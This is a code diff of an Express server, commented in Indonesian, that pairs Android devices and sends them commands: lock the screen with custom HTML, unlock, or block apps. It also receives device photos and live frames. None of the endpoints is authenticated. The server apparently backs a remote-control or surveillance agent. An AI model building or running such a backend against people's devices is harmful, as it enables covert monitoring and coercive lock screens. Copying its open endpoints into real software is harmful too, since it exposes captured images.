@@ -8,125 +8,89 @@ app.use(cors({ limit: '50mb' }));
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ limit: '50mb', extended: true }));
 
-/* Serve static dari beberapa lokasi */
 app.use(express.static('public'));
 app.use(express.static(__dirname));
 app.use(express.static(path.join(__dirname, 'public')));
 
-/* ==================== DATABASE MEMORY ==================== */
+/* ==================== DATABASE ==================== */
 let pairingCodes = {};
 let devices = [];
 let lastPhoto = null;
+let lastFrame = null;
+let lastFrameTime = 0;
 
 /* ==================== PAIRING ==================== */
 app.post('/api/generate-pairing', (req, res) => {
-  try {
-    const code = req.body.code;
-    if (!code) return res.json({ success: false, message: 'Code required' });
-    pairingCodes[code] = { used: false, createdAt: Date.now() };
-    console.log('Pairing code:', code);
-    res.json({ success: true, code: code });
-  } catch (e) {
-    res.json({ success: false, message: e.message });
-  }
+  const code = req.body.code;
+  if (!code) return res.json({ success: false, message: 'Code required' });
+  pairingCodes[code] = { used: false, createdAt: Date.now() };
+  console.log('Pairing code:', code);
+  res.json({ success: true, code: code });
 });
 
 /* ==================== REGISTER DEVICE ==================== */
 app.post('/api/register-device', (req, res) => {
-  try {
-    const code = req.body.code;
-    const name = req.body.name || 'Unknown';
-    const model = req.body.model || 'Unknown';
-    const os = req.body.os || 'Unknown';
-    const type = req.body.type || 'android';
+  const code = req.body.code;
+  if (!pairingCodes[code]) return res.json({ success: false, message: 'Code invalid' });
+  if (pairingCodes[code].used) return res.json({ success: false, message: 'Code used' });
 
-    if (!pairingCodes[code]) {
-      return res.json({ success: false, message: 'Code invalid' });
-    }
-    if (pairingCodes[code].used) {
-      return res.json({ success: false, message: 'Code used' });
-    }
-
-    const device = {
-      id: 'dev_' + Date.now() + '_' + Math.random().toString(36).slice(2, 7),
-      name: name,
-      model: model,
-      os: os,
-      type: type,
-      pairedAt: Date.now(),
-      commands: []
-    };
-
-    devices.push(device);
-    pairingCodes[code].used = true;
-
-    console.log('Device registered:', device.name, device.id);
-    res.json({ success: true, deviceId: device.id });
-  } catch (e) {
-    res.json({ success: false, message: e.message });
-  }
+  const device = {
+    id: 'dev_' + Date.now() + '_' + Math.random().toString(36).slice(2, 7),
+    name: req.body.name || 'Unknown',
+    model: req.body.model || 'Unknown',
+    os: req.body.os || 'Unknown',
+    type: req.body.type || 'android',
+    pairedAt: Date.now(),
+    commands: []
+  };
+  devices.push(device);
+  pairingCodes[code].used = true;
+  console.log('Device registered:', device.name, device.id);
+  res.json({ success: true, deviceId: device.id });
 });
 
 /* ==================== LIST DEVICES ==================== */
 app.get('/api/devices', (req, res) => {
-  res.json(devices.map(d => ({
-    id: d.id,
-    name: d.name,
-    model: d.model,
-    os: d.os,
-    type: d.type
-  })));
+  res.json(devices.map(d => ({ id: d.id, name: d.name, model: d.model, os: d.os, type: d.type })));
 });
 
-/* ==================== COMMAND UNIVERSAL ==================== */
+/* ==================== COMMAND ==================== */
 app.post('/api/command', (req, res) => {
-  try {
-    const deviceId = req.body.deviceId;
-    const type = req.body.type;
-    const extra = {};
-    for (let k in req.body) {
-      if (k !== 'deviceId' && k !== 'type') extra[k] = req.body[k];
-    }
-
-    const device = devices.find(d => d.id === deviceId);
-    if (!device) return res.json({ success: false, message: 'Device not found' });
-
-    const cmd = { type: type, id: Date.now() };
-    for (let k in extra) cmd[k] = extra[k];
-
-    device.commands.push(cmd);
-    console.log('Command sent:', type, 'to', device.name);
-    res.json({ success: true });
-  } catch (e) {
-    res.json({ success: false, message: e.message });
+  const deviceId = req.body.deviceId;
+  const type = req.body.type;
+  const extra = {};
+  for (let k in req.body) {
+    if (k !== 'deviceId' && k !== 'type') extra[k] = req.body[k];
   }
+  const device = devices.find(d => d.id === deviceId);
+  if (!device) return res.json({ success: false, message: 'Device not found' });
+
+  const cmd = { type: type, id: Date.now() };
+  for (let k in extra) cmd[k] = extra[k];
+  device.commands.push(cmd);
+  console.log('Command:', type, '->', device.name);
+  res.json({ success: true });
 });
 
 /* ==================== BACKWARD COMPAT ==================== */
 app.post('/api/lock', (req, res) => {
-  const deviceId = req.body.deviceId;
-  const html = req.body.html;
-  const action = req.body.action;
-  const device = devices.find(d => d.id === deviceId);
+  const device = devices.find(d => d.id === req.body.deviceId);
   if (!device) return res.json({ success: false });
-  if (action === 'unlock') {
+  if (req.body.action === 'unlock') {
     device.commands.push({ type: 'unlock', id: Date.now() });
   } else {
-    device.commands.push({ type: 'lock', html: html || '', id: Date.now() });
+    device.commands.push({ type: 'lock', html: req.body.html || '', id: Date.now() });
   }
   res.json({ success: true });
 });
 
 app.post('/api/block-app', (req, res) => {
-  const deviceId = req.body.deviceId;
-  const appName = req.body.appName;
-  const message = req.body.message;
-  const device = devices.find(d => d.id === deviceId);
+  const device = devices.find(d => d.id === req.body.deviceId);
   if (!device) return res.json({ success: false });
   device.commands.push({
     type: 'blockapp',
-    appName: appName,
-    message: message,
+    appName: req.body.appName,
+    message: req.body.message,
     id: Date.now()
   });
   res.json({ success: true });
@@ -141,19 +105,30 @@ app.get('/api/agent/commands/:deviceId', (req, res) => {
   res.json({ commands: cmds });
 });
 
-/* ==================== FOTO DARI AGENT ==================== */
+/* ==================== FOTO ==================== */
 app.post('/api/photo', (req, res) => {
-  try {
-    lastPhoto = req.body.photo;
-    console.log('Photo received from', req.body.deviceId);
-    res.json({ success: true });
-  } catch (e) {
-    res.json({ success: false, message: e.message });
-  }
+  lastPhoto = req.body.photo;
+  console.log('Photo received from', req.body.deviceId);
+  res.json({ success: true });
 });
 
 app.get('/api/photo/latest', (req, res) => {
   res.json({ photo: lastPhoto });
+});
+
+/* ==================== LIVE FRAME ==================== */
+app.post('/api/liveframe', (req, res) => {
+  lastFrame = req.body.frame;
+  lastFrameTime = Date.now();
+  res.json({ success: true });
+});
+
+app.get('/api/liveframe/latest', (req, res) => {
+  res.json({
+    frame: lastFrame,
+    time: lastFrameTime,
+    age: Date.now() - lastFrameTime
+  });
 });
 
 /* ==================== ROOT ==================== */
